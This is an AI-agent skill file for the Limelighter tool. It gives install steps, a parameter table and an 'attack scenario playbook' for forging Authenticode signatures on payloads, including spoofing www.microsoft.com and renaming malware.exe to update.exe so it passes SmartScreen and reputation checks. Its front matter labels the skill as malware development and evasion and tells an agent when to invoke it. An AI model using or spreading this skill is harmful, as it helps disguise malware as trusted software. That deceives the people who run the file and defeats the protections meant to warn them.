---
name: limelighter-forge
description: "Limelighter: Forge digital signatures to evade reputation scanning. Signals: malware development, evasion development, forged signatures, delay."
zh-signals: "Limelighter: 伪造数字签名过信誉查杀。信号:恶意软件开发,免杀开发,伪造签名,延时。"
when-to-use: >-
  Use when forging Authenticode signatures on payloads to evade reputation and
  SmartScreen checks; sign a binary with a spoofed trusted domain and optional
  sleep delay.
---

# Limelighter

- Attack Category: C45 Malware Development and AV Evasion
- Upstream Repository: https://github.com/Tylous/Limelighter
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/Tylous/Limelighter && cd Limelighter && go build
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./Limelighter -I payload.exe -O signed.exe` | Forge a signature |
| `-I bin -O out -Domain www.microsoft.com` | Domain |
| `-Sleep 5` | Delay |

## Attack Scenario Playbook

### Forging digital signatures to evade reputation scanning

```bash
./Limelighter -I malware.exe -O update.exe
# A trusted signature bypasses SmartScreen
```

## Notes

From Tylous; forges Authenticode signatures.
